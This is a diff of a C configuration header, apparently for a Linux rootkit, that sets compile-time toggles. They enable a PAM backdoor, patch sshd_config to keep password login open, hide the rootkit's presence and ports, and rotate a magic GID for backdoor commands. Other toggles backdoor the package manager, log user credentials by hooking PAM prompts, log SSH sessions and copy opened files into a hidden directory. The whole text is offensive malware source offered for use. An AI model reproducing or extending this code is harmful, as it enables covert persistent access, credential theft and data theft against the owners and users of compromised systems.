@@ -8,8 +8,14 @@
 #define TOGGLES_H
 
 
-/* requires PAM */
+/* requires PAM... */
 #define USE_PAM_BD
+/* makes sure UsePAM & PasswordAuthentication stay enabled on the
+ * box's sshd_config as to make sure the PAM backdoor stays a viable
+ * method of access. */
+#define PATCH_SSHD_CONFIG
+
+
 
 /* all of the essential presence hiding toggles are ignored... */
 #define HIDE_SELF //ignore
@@ -17,6 +23,8 @@
 #define HIDE_PORTS //ignore
 #define DO_REINSTALL //ignore
 #define DO_EVASIONS //ignore
+
+
 
 
 /* the magic GID will not be a static value. there are backdoor commands
@@ -40,9 +48,6 @@
 #define GID_CHANGE_MINTIME 60 * 30 // change GID at least every 30 mins.
 
 
-/* for use with USE_PAM_BD. makes sure UsePAM & PasswordAuthentication
- * stay enabled on the box's sshd_config. */
-#define PATCH_SSHD_CONFIG
 
 
 /* this defines whether or not the `./bdv` command is accessible from within
@@ -68,6 +73,7 @@
 #define BACKDOOR_PKGMAN
 
 
+
 /* requires PAM. logs successful user authentications by hooking
  * the pam_prompt functions and writing respective user credentials
  * to the determined log file. */
@@ -79,17 +85,15 @@
 #define LOG_SSH
 
 
+
 /* when this is defined, files opened by open and fopen
- * are copied to INTEREST_DIR.
- * the files that are of interest to us are defined in
- * hooks/open/char_arrays. */
+ * are copied to INTEREST_DIR. files of interest are defined in
+ * hooks/open/open.h. */
 #define FILE_STEAL
-/* when this is defined w/ FILE_STEAL, when an attempt to
- * steal a file by copying it to its new path fails,
- * attempt to make a new link in the interesting dir for
- * it instead. i would personally discourage using this
- * but it's here anyway... */
+
+/* when an attempt to steal a file by copying fails, link it instead... */
 #undef LINK_IF_ERR //ignore
+
 
 
 #define USE_CRYPT //ignore
